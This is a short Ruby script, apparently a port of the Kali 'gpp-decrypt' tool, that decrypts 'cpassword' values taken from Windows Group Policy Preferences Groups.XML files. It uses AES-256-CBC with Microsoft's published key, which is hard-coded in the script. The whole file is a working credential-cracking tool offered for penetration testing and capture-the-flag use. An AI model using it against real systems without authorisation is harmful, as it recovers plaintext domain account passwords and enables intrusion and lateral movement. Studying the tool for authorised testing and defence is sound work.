#!/usr/bin/ruby
# 2018 WeakNetLabs - Douglas Berdeaux
# Original Work: https://tools.kali.org/password-attacks/gpp-decrypt
# Description: Crack a "cpassword" value from a Groups.XML file using Microsoft's public key
#  Usefule during penetration testing or capture the flag
#
require 'rubygems'
require 'openssl'
require 'base64'

=begin
 Original Work - https://tools.kali.org/password-attacks/gpp-decrypt
 to take user input
=end

if ARGV.length == 0 
 puts "\nGPP-Decrypt2 - 2018 WeakNet Labs\n\nUsage: Pass to me the cpassword value from the XML that you discovered.\n\n"
 exit
end

encrypted_data = ARGV[0]

def decrypt(encrypted_data)
 padding = "=" * (4 - (encrypted_data.length % 4))
 epassword = "#{encrypted_data}#{padding}"
 decoded = Base64.decode64(epassword)

 key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
 # This key comes from Microsoft themselves: https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx
 aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
 aes.decrypt
 aes.key = key
 plaintext = aes.update(decoded)
 plaintext << aes.final
 pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

 return pass
end

puts decrypt(encrypted_data)
